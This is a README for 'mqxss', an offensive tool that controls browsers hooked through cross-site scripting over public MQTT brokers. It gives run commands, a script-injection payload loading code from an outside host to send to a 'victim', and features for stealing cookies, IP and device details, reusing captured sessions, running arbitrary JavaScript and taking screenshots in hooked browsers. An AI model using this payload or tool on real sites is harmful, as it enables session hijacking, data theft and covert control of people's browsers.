# mqxss


## **mqxss acts as a client to communicate with hooked browsers over MQTT**



![Screenshot from 2023-07-03 15-15-35](https://github.com/grampae/mqxss/assets/36344197/d5fae62a-bc5c-4d98-b45e-03cdf541e979)




The benefit to using this over beef or xsshunter is that besides hosting the js payload there is no infra setup, you can use a public broker (however currently uses obfuscation, encryption is in the works).

Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.
 

The client utilizes the python paho.mqtt library while the js payload utilizes 'mqttws31.min.js' which it pulls from here 'https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.1/mqttws31.min.js'.
 
***
 
## Directions
 
**To generate a JS payload** to hook browsers with set the `-g` flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.  

**To run the client** provide your broker, port, and topic as so 
 
`mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname`

**To run the client with credentials** provide your broker, port, user name, password and topic as so 

`mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname -u username -pw password`
  
**Send your XSS payload** to the victim while the mqxss client is running, ex: `'"><script src=https://example.com/x.js async></script>` or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
 
![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)

***
 
**Features:**

- **js payload utilizes MQTT QoS 1 and Last Will, mqxss will be notified of disconnects or connects that occur while client is not connected to the broker**
- **generate js payload at runtime to hook browsers with**
- **currently only works with mqtt brokers that use secure websockets**
- **open hooked browser location with captured cookies in browser for convenience**
- **when hooked it grabs cookies, ip, device type, user agent**
- **view past hooked (unhooked) browsers**
- **send js to currently hooked browsers and get response if available**
- **screenshot of hooked browser**
- **set user , password  for brokers that require it at runtime**
- **pushover notification by setting ptoken and userkey variables in mqxss.py, then utilizing the -po command line flag**
